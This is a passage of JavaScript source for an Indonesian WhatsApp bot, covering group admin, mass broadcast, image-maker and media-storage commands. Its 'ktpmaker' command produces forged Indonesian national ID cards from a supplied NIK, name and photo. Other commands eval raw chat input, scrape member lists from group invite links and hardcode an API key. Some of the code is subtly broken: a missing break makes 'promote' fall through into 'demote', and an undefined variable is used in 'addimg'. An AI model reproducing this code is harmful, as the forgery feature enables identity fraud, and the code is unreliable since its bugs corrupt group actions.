              type: 1,
            },
          ]);
        }
        break;
	case 'antivirtex':
 if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())       
        if (args[0] == "on") {
          if (isAntivirtex) return reply(lang.anjawaUdhOn(command))
          antivirtex.push(from);
          fs.writeFileSync(
            "./src/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply(lang.anjawaOn(command))
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./src/antivirtex.json", JSON.stringify(ant));
          reply(lang.anjawaOff(command))
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Choose one`, [
            {
              buttonId: 'antivirtex on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antivirtex off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
			case 'admin':
					if (!isGroup) return fakestatus('```KHUSUS GRUP BRO```')
					teks = `*DAFTAR ATASAN GROUP* _${groupMetadata.subject}_\n*TOTAL* : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
					no += 1
					teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
			
			case 'tagall':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())       
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
					teks += `@${mem.jid.split('@')[0]}\n`
					members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break

			case 'clearall':
			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			        anu = await alpha.chats.all()
					alpha.setMaxListeners(10)
					for (let _ of anu) {
					alpha.deleteChat(_.jid)
					}
					fakegroup(lang.success())
					break
            case 'out':
                    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					setTimeout( () => {
					alpha.groupLeave (from) 
					}, 2000)
					setTimeout( () => {
					alpha.updatePresence(from, Presence.composing) 
					fakestatus('```Byeee 👋```')
					}, 0)
					break       
		    case 'leave2':
                    if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					setTimeout( () => {
					alpha.groupLeave (q) 
					}, 2000)
					setTimeout( () => {
					alpha.updatePresence(from, Presence.composing) 
					fakestatus('```Ok gua out```')
					}, 0)
					break       
           case 'getpp':
				if (mek.message.extendedTextMessage != undefined){
					let mentioneddd = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await alpha.getProfilePicture(mentioneddd[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					seeer = `Nama : *${pushname}`
					thumbb = await getBuffer(pic)
					anuu  = {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6289523258649-1604595598@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 Bot by zeeone 」`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                    alpha.sendMessage(from, thumbb ,image, anuu)
				}
				break
	case 'inspect':
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(lang.erorLink())
		            if (!q) return reply('```Masukkan link groupnya```')
		            cos = args[0]
		            var net = cos.split('https://chat.whatsapp.com/')[1]
		            if (!net) return reply('pastikan itu link https://whatsapp.com/')
		            jids = []
		            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await alpha.query({ 
		            json: ["query", "invite",net],
		            expect200:true })
		            let par = `*Id* : ${id}
		${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
		*Nama Gc* : ${subject}
		*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
		*Jumlah Member* : ${size}
		${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
		*Id desc* : ${descId}
		${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
		           for ( let y of participants) {
		             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
		             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
		             }
		             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             alpha.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
		             } catch {
		             reply(lang.erorLink())
		             }
		             break
			case 'return':
			case 'cek':
			case 'me':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					return alpha.sendMessage(from, JSON.stringify(eval(args.join(' '))), text, { quoted: ftroli})
					break
			case 'bc':
			case 'broadcast':
			case 'bcimage':
					if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (args.length < 1) return reply('```TEXT?```')
					arg = args.join(' ');
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					bc = await alpha.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					await alpha.sendMessage(_.jid, bc, image, {thumbnail: bc, quoted:fkontak ,caption: `「  *BROADCAST* 」\n\n${arg}`})
					}
					fakegroup(lang.successBc())
					} else {
					await ini_bc_pc_bang(arg)
					fakegroup(lang.successBc())
					}
					break
			case 'bcgc':
					case 'bcgroup':
					case 'bcgrup':
					case 'broadcastgrup':
		if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
                    if (args.length < 1) return reply(`Untuk broadcast ke semua group ketik:\n${prefix}bcgroup [isi chat]`)
                    var group = await alpha.groupMetadata(from)
			ini_bc = args.join(' ')
		var groupz = await alpha.chats.all().filter(v => v.jid.endsWith('g.us'))
                    reply(`\`\`\`[ ! ]\`\`\` Broadcast in progress! Total: ${groupz.length} groups`)
                    await ini_bc_gc_bang(ini_bc)
					reply(`\`\`\`[ ✓ ] Success broadcast : ${groupz.length} groups\`\`\``)
					break
			case 'buggc':
			if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					await alpha.toggleDisappearingMessages(from, 0)
					break
			case 'infogc':
					alpha.updatePresence(from, Presence.composing)
					if (!isGroup) return reply(lang.onlygc())
					try {
					ppimg = await alpha.getProfilePicture(from)
					} catch {
						ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
					}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nama grup :* ${groupName}\n*Deskripsi :* ${groupDesc}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Member :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					alpha.sendMessage(from, buf, image, {quoted: mek, caption: teks})
					break
			case 'ghstalk': 
            case 'githubstalk': 
            case 'ghuser':
               {
                if (args.length < 1) return reply(`Kirim perintah *${prefix}ghstalk* _username_`)
                reply(lang.wait())
                axios.get(`https://api.github.com/users/${args[1]}`)
                .then((res) => res.data)
                .then((res) =>{
                    let { login, type, name, followers, following, created_at, updated_at, public_gists, public_repos, twitter_username, bio, hireable, email, location, blog, company, avatar_url, html_url } = res
                    let txt = `*GITHUB STALKING*

*Data Berhasil Didapatkan!*
▷ Username : ${login}
▷ Name : ${name}
▷ Followers : ${followers}
▷ Following : ${following}
▷ Created at :  ${moment(created_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Updated at : ${moment(updated_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Public Gists : ${public_gists}
▷ Public Repos : ${public_repos}
▷ Twitter : ${twitter_username}
▷ Email : ${email}
▷ Location : ${location}
▷ Blog : ${blog}
▷ Link : ${html_url}
▷ Bio :\n${bio}`
                    sendFileFromUrl(from, avatar_url, txt, mek)
                      })
                .catch((err) => {
                    sendMess(owner, 'Error : ' + err)
                    console.log(color('[ EXEC ]', 'red'), err)
					reply(mess.error.api)
                })
            }
                break
              case 'smeme': 
					arg = args.join(' ');
					top = arg.split('|')[0]
					bottom = arg.split('|')[1]
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length > 0) {
					let dger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					owigi = await  alpha.downloadAndSaveMediaMessage(dger)
					oanu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owigi)
					oteks = `${oanu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					var anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${oteks}`
					var smeme = await getBuffer(anu2)
					alpha.sendMessage(from, smeme, image, {thumbnail: Buffer.alloc(0)})
					} else {
					reply('Gunakan foto!')
					}
					break
			case 'demoteall':
			if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
			                members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
			                alpha.groupDemoteAdmin(from, members_id)
			                break
			case 'promoteall':
			if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
                members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
                alpha.groupMakeAdmin(from, members_id)
                break
              case 'promote':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentionede = mek.message.extendedTextMessage.contextInfo.participant
alpha.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes promote`
alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
				case 'demote':
					if (!isGroup) return reply(lang.onlygc())
					if (!isGroupAdmins) return reply(lang.onlygcAdmin())
					if (!isBotGroupAdmins) return reply(lang.botNotAdm())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentionede = mek.message.extendedTextMessage.contextInfo.participant
alpha.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes demote`
alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
break
                
                /*
                ]----------------------------------------------------------------> API ZEKS <----------------------------------------------------------------[
                */
// photooxy
//2 text
case 'captain_as':
case 'smoke':
case 'tiktok2': 
case 'arcade':
case 'battlefield':
case 'pubg':
if (args.length < 1) return reply(lang.tahta(prefix, command))
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let photooxy = await getBuffer(`${alphaapi}/photooxy/${command}?apikey=${alphakey}&text=${m1}&text2=${m2}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,photooxy, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
await  limitAdd(sender, limit)
break                
          
// 1 text
case 'shadow':
case 'cname':
case 'romantic':
case 'burnpaper':
case 'funnycup':
case 'love':
case 'undergrass':          
case 'heart':
case 'coffeecup':
case 'wood':          
case 'flower':         
case 'wooden': 
case '3dsummer':
case 'wolf_metal':
case '3dnature':
case 'underwater':          
case 'goldenrose':
case 'vector':
case 'typography':
case 'typography2': 
case 'underfall':  
case 'smokyneon': 
case 'rainbow': 
case 'graffiti':
case 'camouflage':
case '3dglowing':          
case 'vintage':
case 'honey': 
case 'whitecube':
case 'avatar': 
case 'glowrainbow':
case 'nightsky':
case 'fur':
case 'flaming':          
case 'crisp':
case 'embroidery':
case 'bcake':          
case '3dligth':
case 'metallic': 
case 'striking':
case 'watermelon':         
case 'butterfly':
case 'harry':
case 'glowneon':
case 'coffecup2':          
case 'luxury': 
case 'cemetery':
case 'woodblock':
case 'sweet':
case 'simple':
case 'bevel':
case 'underflower':         
case 'underflower2':
if (args.length < 1) return reply(lang.noteks(prefix, command))
let photooxy2 = await getBuffer(`${alphaapi}/photooxy/${command}?apikey=${alphakey}&text=${q}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,photooxy2, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
await  limitAdd(sender, limit)
break         

//TEXT PRO
//2 TEXT
case 'halloween2':
case 'horror':
case 'game8bit':
case 'layered':
case 'glitch2':
case 'coolg':
case 'coolwg':
case 'realistic':
case 'space3d':
case 'gtiktok':
case 'stone':
case 'marvel':
case 'marvel2':
case 'pornhub':
case 'avengers':
case 'metalr':
case 'metalg':
case 'metalg2':
case 'halloween2':
case 'lion':
case 'wolf_bw':
case 'wolf_g':
case 'ninja':
case '3dsteel':
case 'horror2':
case 'lava':
case 'bagel':
if (args.length < 1) return reply(lang.tahta(prefix, command))
var m = q
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let textpro = await getBuffer(`${alphaapi}/textpro/${command}?apikey=${alphakey}&text=${m1}&text2=${m2}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,textpro, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
await  limitAdd(sender, limit)
break 
//1 TEXT  
case 'blackpink':
case 'rainbow2':
case 'water_pipe':
case 'halloween':
case 'sketch':
case 'sircuit':
case 'discovery':
case 'metallic2':
case 'fiction':
case 'demon':
case 'transformer':
case 'berry':
case 'thunder':
case 'magma':
case '3dstone':
case 'neon':
case 'glitch':
case 'harry_potter':
case 'embossed':
case 'broken':
case 'papercut':
case 'gradient':
case 'glossy':
case 'watercolor':
case 'multicolor':
case 'neon_devil':
case 'underwater':
case 'bear':
case 'wonderfulg':
case 'christmas':
case 'neon_light':
case 'snow':
case 'cloudsky':
case 'luxury2':
case 'gradient2':
case 'summer':
case 'writing':
case 'engraved':
case 'summery':
case '3dglue':
case 'metaldark':
case 'neonlight':
case 'oscar':
case 'minion':
case 'holographic':
case 'purple':
case 'glossyb':
case 'deluxe2':
case 'glossyc':
case 'fabric':
case 'neonc':
case 'newyear':
case 'newyear2':
case 'metals':
case 'xmas':
case 'blood':
case 'darkg':
case 'joker':
case 'wicker':
case 'natural':
case 'firework':
case 'skeleton':
case 'balloon':
case 'balloon2':
case 'balloon3':
case 'balloon4':
case 'balloon5':
case 'balloon6':
case 'balloon7':
case 'steel':
case 'gloss':
case 'denim':
case 'decorate':
case 'decorate2':
case 'peridot':
case 'rock':
case 'glass':
case 'glass2':
case 'glass3':
case 'glass4':
case 'glass5':
case 'glass6':
case 'glass7':
case 'glass8':
case 'captain_as2':
case 'robot':
case 'equalizer':
case 'toxic':
case 'sparkling':
case 'sparkling2':
case 'sparkling3':
case 'sparkling4':
case 'sparkling5':
case 'sparkling6':
case 'sparkling7':
case 'decorative':
case 'chocolate':
case 'strawberry':
case 'koifish':
case 'bread':
case 'matrix':
case 'blood2':
case 'neonligth2':
case 'thunder2':
case '3dbox':
case 'neon2':
case 'roadw':
case 'bokeh':
case 'gneon':
case 'advanced':
case 'dropwater':
case 'wall':
case 'chrismast':
case 'honey':
case 'drug':
case 'marble':
case 'marble2':
case 'ice':
case 'juice':
case 'rusty':
case 'abstra':
case 'biscuit':
case 'wood':
case 'scifi':
case 'metalr':
case 'purpleg':
case 'shiny': 
case 'jewelry':
case 'jewelry2':
case 'jewelry3':
case 'jewelry4':
case 'jewelry5':
case 'jewelry6':
case 'jewelry7':
case 'jewelry8':
case 'metalh':
case 'golden':
case 'glitter':
case 'glitter2':
case 'glitter3':
case 'glitter4':
case 'glitter5':
case 'glitter6':
case 'glitter7':
case 'metale':
case 'carbon':
case 'candy':
case 'metalb':
case 'gemb':
case '3dchrome':
case 'metalb2':
case 'metalg':
if (args.length < 1) return reply(lang.noteks(prefix, command))
let textpro2 = await getBuffer(`${alphaapi}/textpro/${command}?apikey=${alphakey}&text=${q}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,textpro2, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
await  limitAdd(sender, limit)
break  
case 'tahta':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   tahta = await getBuffer(`${ApiZeks}/api/hartatahta?text=${F}&apikey=${zeksApikey}`)
                   tahtah = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(tahta, tahtah, sender)
                  await  limitAdd(sender, limit)
                  break
       case 'ytgold':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   ytgold = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytgoldp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(ytgold, ytgoldp, sender)
                   await  limitAdd(sender, limit)
                   break  
       case 'ytsilver':  
                   if (args.length < 1) return reply(lang.noteks(prefix, command))
                   F = q
                   reply(lang.wait())
                   ytsilver = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
                   ytsilverp = `${lang.success()}\n\nPlease Subscribe https://youtu.be/w4iQ4rwA0mo`
                   sendImageMaker(ytsilver, ytsilverp, sender)
                   await  limitAdd(sender, limit)
                   break              
     case 'nulis':
									reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
									break
						case 'nuliskiri':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'22',
									'-interline-spacing',
									'2',
									'-annotate',
									'+140+153',
									fixHeight,
									'./media/nulis/images/buku/setelahkiri.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'nuliskanan':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
									spawn('convert', [
									'./media/nulis/images/buku/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'2',
									'-annotate',
									'+128+129',
									fixHeight,
									'./media/nulis/images/buku/setelahkanan.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokiri':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkiri.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'1720x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'4',
									'-annotate',
									'+48+185',
									fixHeight,
									'./media/nulis/images/folio/setelahkiri.jpg'
									])
									.on('error', () => reply(lang.tryAgain()))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
										})
									}
									break
						case 'foliokanan':{
									if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
									reply(mess.wait)
									const tulisan = q
									const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
									const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
									spawn('convert', [
									'./media/nulis/images/folio/sebelumkanan.jpg',
									'-font',
									'./media/nulis/font/Indie-Flower.ttf',
									'-size',
									'960x1280',
									'-pointsize',
									'23',
									'-interline-spacing',
									'3',
									'-annotate',
									'+89+190',
									fixHeight,
									'./media/nulis/images/folio/setelahkanan.jpg'
									])
									.on('error', () => reply(mess.error))
									.on('exit', () => {
										alpha.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {thumbnail:Buffer.alloc(0),quoted: mek, caption: `Jangan Malas`})
										limitAdd(sender, limit)
									})
									}
									break      
       case 'ttp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    ttp = args.join(' ')
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${ttp}`)
                    alpha.sendMessage(from, anu1, image, {quoted: ftroli, caption : '.sticker'})
                    break
         case 'attp':  
                    if (args.length < 1) return reply(lang.noteks(prefix, command))
                    hhhh = q
                    anu1 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${hhhh}`)
                    alpha.sendMessage(from, anu1, sticker, {quoted: mek})
                    break
             case 'ktpmaker': case 'ktp':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    reply('waitt')
                    bikin = (`https://ferdiz-afk.my.id//api/maker/ktp?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gdarah=-&almt=${jl}&rt-rw=${rtrw}&kel=${lurah}&kcmtn=${camat}&agma=${agama}&status=${nikah}&kerja=${kerja}&negara=${warga}&berlaku=${until}&prov=${prov}&kab=${kabu}&picurl=${img}`)
                      console.log(bikin)
                    imge = await getBuffer(bikin)
                    await alpha.sendMessage(from, imge, image, { thumbnail: Buffer.alloc(0), quoted: mek });
                    break;
        case 'nulis2':
if (args.length < 1) return reply(`*Usage*: ${prefix + command} nama&kelas&nomor&kata\n*Example*: ${prefix + command} udin&20&17&blablabla`)
var bodi = args.join(" ")
var nama = bodi.split("&")[0];
var kelas = bodi.split("&")[1];
var no = bodi.split("&")[2];
var aksarane = bodi.split("&")[3];
reply('membuat bos...')
                 rakz = await getBuffer(`https://ferdiz-afk.my.id//api/tulis?nama=${nama}&no=${no}&kelas=${kelas}&text=${aksarane}`)
                 alpha.sendMessage(from, rakz, image, { quoted: mek ,thumbnail: Buffer.alloc(0) });

                 break;
              /*
              ]----------------------------------------------------------------> STORAGE <----------------------------------------------------------------[
              */
	        case 'addstik':
	if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedSticker) return fakestatus('Reply stiker')
					nm = body.slice(9)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(boij)
					setiker.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./temp/stik.json', JSON.stringify(setiker))
					fakegroup(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
					break
	      case 'liststik':
	      case 'liststiker':
	      case 'liststc':
					teks = '*Sticker list :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
					
			case 'addimg':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedImage) return fakegroup('```Reply imagenya```')
					clara = body.slice(8)
					if (!clara) return fakegroup('```Nama imagenya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/foto/${svst}.jpg`, delb)
					fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`)
					break
			case 'listimg':
					teks = '*Image list :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama foto/image_`
					fakegroup(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
			case 'addvid':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedVideo) return fakegroup('```Reply vidionya```')
					svst = body.slice(8)
					if (!svst) return fakegroup('```Nama vidionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/video/${svst}.mp4`, delb)
					fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`)
					break
	        case 'listvid':
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}* \n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama video_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
			
			case 'addvn':
			if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
					if (!isQuotedAudio) return fakegroup('```Reply vnnya```')
					svst = body.slice(7)
					if (!svst) return reply('```Nama audionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./media/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
